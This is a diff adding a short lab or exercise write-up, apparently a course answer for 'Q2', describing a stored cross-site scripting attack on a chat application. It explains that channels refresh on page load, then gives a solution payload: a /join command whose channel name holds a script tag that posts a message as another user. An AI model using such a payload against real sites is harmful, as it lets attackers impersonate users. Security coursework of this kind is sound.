@@ -1,0 +1,16 @@
+Q2 - Post in others name (using XSS)
+I noticed in code.js that each time the page refreshes, the channels and messages are refreshed as well :
+function Refresh() {
+  RefreshChannels(true);
+  RefreshMessages(true);
+  ...
+  
+Therefore I created a new channel (using the /join command inside a message I posted from edward profile)
+so that each time the page refreshes, this channel will also refresh and because I put a script in it, it will render this script :)
+
+SOLUTION:
+#general_spam
+
+/join #<script>$.post("/post", {'channel': "#general-spam",'message': "Good morning!"})</script>
+
+
